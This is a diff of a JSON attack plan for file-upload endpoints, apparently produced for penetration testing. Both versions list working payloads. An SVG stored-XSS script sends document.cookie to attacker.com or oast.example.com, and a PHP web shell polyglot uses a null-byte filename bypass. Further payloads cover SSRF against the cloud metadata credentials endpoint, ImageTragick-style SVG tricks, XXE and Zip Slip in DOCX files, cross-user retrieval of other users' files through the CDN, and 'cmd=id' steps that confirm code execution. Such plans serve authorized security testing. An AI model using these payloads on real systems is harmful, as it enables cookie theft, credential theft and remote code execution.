@@ -1,50 +1,83 @@
 {
-  "endpoint": "POST /api/v1/documents/upload",
-  "storage_backend": "local_disk",
-  "served_path": "/documents/<id>/<original_filename>",
-  "mime_enforcement": "content_type_header_only",
-  "post_processing": [
-    "ImageMagick thumbnail generation (thumb.jpg created after upload, status: processing → ready)"
-  ],
-  "chain_steps": [
+  "upload_endpoint": "POST /api/v1/attachments",
+  "storage_model": "s3",
+  "content_type_checks": "mime_only",
+  "filename_handling": "preserved",
+  "attack_vectors": [
     {
-      "step": 1,
-      "technique": "svg_xss",
-      "request_mutation": "Upload filename='payload.svg' with Content-Type: image/svg+xml. File content: <svg xmlns='http://www.w3.org/2000/svg'><script>fetch('https://attacker.com/?c='+document.cookie)</script></svg>",
-      "gate_to_pass": "Extension .svg not in blocklist (.php, .jsp, .sh only); Content-Type: image/svg+xml accepted by image/* allowlist; file served inline without Content-Disposition: attachment",
-      "next_step_requires": "Victim must open /documents/<id>/payload.svg in browser — script executes in app.example.com origin context",
+      "id": "svg_xss_1",
+      "technique": "stored_xss_svg",
+      "test_payload": "Upload file with filename='xss.svg' and Content-Type='image/svg+xml'. File content: <?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('https://oast.example.com/?c='+document.cookie)</script></svg>",
+      "retrieval_url_pattern": "https://cdn.example.com/attachments/{uuid}",
       "exploit_value": "critical",
       "cwe": "CWE-79"
     },
     {
-      "step": 2,
-      "technique": "metadata_injection",
-      "request_mutation": "Upload a valid JPEG with EXIF comment field set to: <script>alert(document.domain)</script>. If thumbnail generation embeds EXIF data in output, XSS fires when thumb.jpg is rendered as HTML by a vulnerable viewer.",
-      "gate_to_pass": "ImageMagick may copy EXIF metadata into generated thumbnail; server does not strip metadata before serving",
-      "next_step_requires": "Thumbnail must be opened by a component that renders EXIF as HTML (PDF viewer, metadata display panel, or admin dashboard showing file properties)",
-      "exploit_value": "medium",
-      "cwe": "CWE-116"
+      "id": "ssrf_link_preview_1",
+      "technique": "ssrf_via_url_fetch",
+      "test_payload": "POST /api/v1/attachments/{id}/preview with body: {\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
+      "retrieval_url_pattern": "https://app.example.com/api/v1/attachments/{id}/preview",
+      "exploit_value": "critical",
+      "cwe": "CWE-918"
     },
     {
-      "step": 3,
-      "technique": "polyglot_file",
-      "request_mutation": "Create a file that is simultaneously valid JPEG (magic bytes FF D8 FF) and contains a PHP web shell appended after JPEG EOF (FF D9) marker. Upload with filename='shell.php.jpg' and Content-Type: image/jpeg.",
-      "gate_to_pass": "Extension check only validates last extension (.jpg passes). Content-Type: image/jpeg accepted. Magic byte check (if any) satisfied by JPEG header. If PHP interpreter is configured for .php.jpg or aliases exist, shell executes.",
-      "next_step_requires": "Web server must execute .php.jpg as PHP — requires misconfigured AddHandler or FilesMatch directive. Confirm by requesting /documents/<id>/shell.php.jpg and checking for PHP execution.",
-      "exploit_value": "critical",
+      "id": "polyglot_webshell_1",
+      "technique": "polyglot_webshell",
+      "test_payload": "Upload file with filename='shell.php.jpg' and Content-Type='image/jpeg'. File content: GIF89a<?php system($_GET['cmd']); ?> (GIF magic bytes prepended to PHP payload). If server strips extension suffix, try filename='shell.php%00.jpg'.",
+      "retrieval_url_pattern": "https://cdn.example.com/attachments/{uuid}",
+      "exploit_value": "high",
       "cwe": "CWE-434"
+    },
+    {
+      "id": "mime_confusion_html_1",
+      "technique": "mime_confusion",
+      "test_payload": "Upload file with filename='report.pdf' and Content-Type='application/pdf'. File content is valid HTML: <html><body><script>alert(document.domain)</script></body></html>. If CDN serves without Content-Type override, browser sniffs as text/html.",
+      "retrieval_url_pattern": "https://cdn.example.com/attachments/{uuid}",
+      "exploit_value": "high",
+      "cwe": "CWE-79"
+    },
+    {
+      "id": "cross_user_unauth_access_1",
+      "technique": "stored_xss_svg",
+      "test_payload": "Upload any file as Account_A. Capture returned UUID. Attempt retrieval of https://cdn.example.com/attachments/{uuid} as Account_B (no session cookie) — no signed URL or auth check on CDN.",
+      "retrieval_url_pattern": "https://cdn.example.com/attachments/{uuid}",
+      "exploit_value": "high",
+      "cwe": "CWE-434"
+    },
+    {
+      "id": "thumbnail_imagemagick_ssrf_1",
+      "technique": "ssrf_via_url_fetch",
+      "test_payload": "Upload SVG file with embedded ImageMagick delegate instruction: <svg><image href=\"http://169.254.169.254/latest/meta-data/\"/></svg> as Content-Type image/svg+xml. Thumbnail generator invokes ImageMagick or librsvg which may issue the SSRF.",
+      "retrieval_url_pattern": "https://cdn.example.com/attachments/{uuid}/thumbnail",
+      "exploit_value": "high",
+      "cwe": "CWE-918"
     }
   ],
-  "execution_surfaces": [
-    "ImageMagick thumbnail generation — vulnerable to CVE-2016-3714 (ImageTragick) on unpatched versions; SVG/PDF inputs to ImageMagick can achieve SSRF or RCE",
-    "Local disk with direct path serving — if .htaccess upload is possible, PHP execution via AddType directive"
+  "cross_user_retrieval": {
+    "testable": true,
+    "method": "direct_id",
+    "test_steps": [
+      "Upload any file as Account_A; capture the attachment_id UUID from the 201 response.",
+      "In a separate session as Account_B (different user, no sharing relationship), fetch https://cdn.example.com/attachments/{captured_uuid} directly.",
+      "Proof of bypass: CDN returns 200 with Account_A's file content, confirming no authorization check on the unsigned CDN URL."
+    ]
+  },
+  "async_processing": [
+    {
+      "surface": "thumbnail_generation",
+      "trigger": "Upload of image/* or application/pdf content type; thumbnail_url field appears ~2s after upload",
+      "attack_note": "Thumbnail generator (likely ImageMagick or Pillow) processes the uploaded file in a privileged context. SVG uploads with embedded HTTP references or MSL/MVG directives can trigger SSRF or RCE via ImageMagick delegate rules (CVE-2016-3714 class). PDF uploads may trigger ghostscript. Upload a crafted SVG with <image href='http://internal-metadata/'/> and poll the thumbnail_url to detect SSRF via response timing or OOB DNS callback."
+    },
+    {
+      "surface": "docx_preview_render",
+      "trigger": "Upload of .docx or application/vnd.openxmlformats-officedocument.wordprocessingml.document; preview iframe visible in UI",
+      "attack_note": "DOCX is a ZIP archive. Embed an XXE payload in word/document.xml referencing an external entity pointing to an internal service. The preview renderer (LibreOffice, unoconv, or similar) may resolve the external entity and exfiltrate content. Also test for Zip Slip: use a filename like ../../etc/cron.d/evil inside the archive."
+    }
   ],
-  "path_traversal_risk": "medium",
-  "path_traversal_note": "Filename preserved in URL (/documents/<id>/<filename>) but id prefix likely prevents directory escape. Test filename='../../../etc/passwd' — if server strips path separators, risk is low; if not, local file read possible.",
   "stop_conditions": [
-    "SVG XSS: request /documents/<id>/payload.svg in browser — if script tag in response body is served with Content-Type: image/svg+xml, payload executes in app.example.com origin",
-    "ImageMagick RCE (ImageTragick): upload SVG referencing file:///etc/passwd as image href — if thumbnail generation fetches the file, contents appear in thumb.jpg EXIF",
-    "PHP polyglot: GET /documents/<id>/shell.php.jpg?cmd=id — if response contains 'uid=' then PHP execution is confirmed"
+    "Account_B receives 200 response with Account_A's file content via the CDN URL with no session token — this is sufficient proof of insecure direct object reference on CDN layer",
+    "OOB DNS or HTTP callback received at oast.example.com after uploading SVG with fetch() or ImageMagick delegate payload — proves XSS or SSRF respectively",
+    "SVG served by CDN with Content-Type image/svg+xml causes JavaScript execution in victim browser when iframe preview loads it — proves stored XSS"
   ],
-  "summary": "SVG upload bypasses extension blocklist and inline serving enables stored XSS in app.example.com origin; ImageMagick post-processing creates secondary RCE/SSRF surface via ImageTragick"
+  "summary": "Unsigned CDN URLs expose all attachments to unauthenticated cross-user retrieval; SVG upload with preserved filename served from same CDN origin achieves stored XSS; async thumbnail generator is an ImageMagick SSRF surface"
 }
